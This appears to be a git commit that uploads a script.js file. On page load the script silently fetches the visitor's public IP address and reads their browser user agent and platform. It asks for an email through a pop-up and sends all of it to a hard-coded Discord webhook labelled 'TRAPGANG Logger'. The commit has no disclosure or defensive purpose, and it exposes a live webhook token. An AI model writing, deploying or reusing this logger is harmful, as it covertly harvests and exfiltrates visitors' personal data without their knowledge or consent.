e5f29c7d20c507c378184ae60201bd5f8f8c68a1
LilBlood16 <jaylua2548@gmail.com>
2025-04-18 13:32:31 +0800

    Add files via upload

---
+++ script.js
@@ -0,0 +1,37 @@
+window.onload = function () {
+  fetch('https://api64.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+          const ip = data.ip;
+          const device = navigator.userAgent;
+          const platform = navigator.platform;
+          const email = prompt("Enter your email to continue:");
+
+          const webhookURL = "https://discord.com/api/webhooks/1362658452266287125/dZIoJad_qKV4tBtOm8YXOU6jcCCGbNCj9ccfsUWwDXc_jGQAI9_I0oVyiVB4QZPaZOFG";
+
+          const embedData = {
+              "username": "Visitor Logger",
+              "avatar_url": "https://cdn.discordapp.com/icons/123456789012345678/yourimage.png",
+              "embeds": [{
+                  "title": "📌 **New Visitor Logged!**",
+                  "color": 16711680,
+                  "fields": [
+                      { "name": "🔹 **IP Address**", "value": `\`${ip}\``, "inline": false },
+                      { "name": "📱 **Device**", "value": `\`${device}\``, "inline": false },
+                      { "name": "💻 **Platform (OS)**", "value": `\`${platform}\``, "inline": false },
+                      { "name": "📧 **Gmail**", "value": `\`${email || "Not provided"}\``, "inline": false }
+                  ],
+                  "footer": { "text": "🚀 TRAPGANG Logger" }
+              }]
+          };
+
+          fetch(webhookURL, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(embedData)
+          });
+      })
+      .catch(err => console.error('Error:', err));
+};
